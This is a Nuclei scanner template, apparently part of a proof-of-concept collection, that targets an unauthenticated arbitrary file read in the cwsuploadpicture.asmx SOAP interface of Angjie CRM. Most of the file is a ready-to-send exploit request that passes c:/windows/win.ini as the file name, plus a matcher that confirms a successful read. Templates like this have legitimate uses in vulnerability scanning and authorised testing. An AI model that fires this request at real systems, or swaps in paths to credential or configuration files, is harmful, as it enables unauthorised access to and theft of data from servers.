pocs/nuclei/ajcrm-cwsuploadpicture-lfi.yaml

id: ajcrm-cwsuploadpicture-lfi
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 昂捷CRM（Customer Relationship Management）是深圳市昂捷信息技术股份有限公司提供的一款专注于零售行业客户关系管理的系统。旨在帮助零售企业更好地管理客户、提升客户满意度和忠诚度，从而推动业务增长。该系统集成了客户信息管理、会员营销、客户服务等多个功能模块，为零售企业提供全方位的客户关系管理解决方案。昂捷CRM cwsuploadpicture.asmx接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%98%82%E6%8D%B7ERP/%E6%98%82%E6%8D%B7CRM%E7%B3%BB%E7%BB%9Fcwsuploadpicture.asmx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetPicture"
        Content-Length: 380

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetPicture xmlns="http://tempuri.org/">
              <sFullFileName>c:/windows/win.ini</sFullFileName>
            </GetPicture>
          </soap:Body>
        </soap:Envelope>
    matchers:
      - type: word
        part: body
        words:
          - 'OyBmb'
